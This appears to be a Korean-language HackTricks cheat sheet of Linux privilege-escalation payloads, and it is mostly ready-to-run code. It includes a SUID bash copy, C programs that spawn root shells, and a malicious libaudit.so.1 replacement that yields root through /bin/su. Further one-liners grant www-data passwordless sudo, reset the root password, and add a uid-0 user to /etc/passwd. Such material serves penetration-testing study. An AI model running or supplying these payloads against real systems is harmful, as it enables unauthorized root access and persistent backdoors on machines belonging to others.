# 실행할 페이로드

{{#include ../../banners/hacktricks-training.md}}

## 배시
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## 권한 상승을 위한 파일 덮어쓰기

### 일반 파일

- _/etc/passwd_에 비밀번호가 있는 사용자 추가
- _/etc/shadow_에서 비밀번호 변경
- _/etc/sudoers_에 사용자 추가
- 일반적으로 _/run/docker.sock_ 또는 _/var/run/docker.sock_에 있는 도커 소켓을 통해 도커 남용

### 라이브러리 덮어쓰기

어떤 바이너리에서 사용되는 라이브러리를 확인합니다. 이 경우는 `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
이 경우 `/lib/x86_64-linux-gnu/libaudit.so.1`를 가장해 보겠습니다.\
따라서 **`su`** 바이너리에서 사용되는 이 라이브러리의 함수를 확인하십시오:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
기호 `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` 및 `audit_fd`는 아마도 libaudit.so.1 라이브러리에서 온 것입니다. libaudit.so.1이 악성 공유 라이브러리에 의해 덮어쓰여지기 때문에, 이러한 기호는 새로운 공유 라이브러리에 존재해야 하며, 그렇지 않으면 프로그램이 기호를 찾을 수 없고 종료됩니다.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
이제 단순히 **`/bin/su`**를 호출하면 루트로서 셸을 얻을 수 있습니다.

## 스크립트

루트가 무언가를 실행하도록 할 수 있나요?

### **www-data를 sudoers에 추가**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **루트 비밀번호 변경**
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd에 새로운 루트 사용자 추가
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
{{#include ../../banners/hacktricks-training.md}}
